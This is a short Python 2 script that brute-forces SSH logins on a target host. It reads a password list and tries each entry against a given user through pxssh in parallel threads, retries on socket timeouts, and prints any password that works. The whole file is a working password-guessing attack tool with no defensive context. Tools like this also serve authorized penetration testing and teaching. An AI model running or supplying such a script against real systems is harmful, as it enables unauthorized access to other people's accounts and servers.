import pxssh
import optparse
import time
from threading import *

maxConnections = 5
connection_lock = BoundedSemaphore(value = maxConnections)
Found = False
Fails = 0


def connection(host, user, password, release):
    global Found
    global Fails
    try:
        s = pxssh.pxssh()
        s.login(host, user, password, release)
        print '[+] Password Found' + password
        Found = True
    except Exception, e:
        if 'read_nonblocking' in str(e):
            time.sleep(5)
            Fails += 1
            connection(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connection(host, user, password, False)
    finally:
        if release:
            connection_lock.release()


def main():
    parser = optparse.OptionParser('usage %prog ' + '-H <target host> -u <user> -F <passwordlist>')
    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
    parser.add_option('-F', dest='passwdFile', type='string', help='specify file path')
    parser.add_option('-u', dest='user', type='string', help='specify the user')

    (options, args) = parser.parse_args()
    host = options.tgtHost
    passwdFile = options.passwdFile
    user = options.user

    if host == None or passwdFile == None or user == None:
        print parser.usage
        exit(0)

    fn = open(passwdFile, 'r')
    for line in fn.readlines():
        if Found:
            print '[*] Existing: Password Found'
            exit(0)
        if Fails > 5:
            print '[!] Too Many Socket Timeouts'
            exit(0)
        connection_lock.acquire()
        password = line.strip('\r').strip('\n')
        print '[-] Testing: '+str(password)
        t = Thread(target=connection, args=(host, user, password, True))
        child = t.start()

if __name__ == '__main__':
    main()










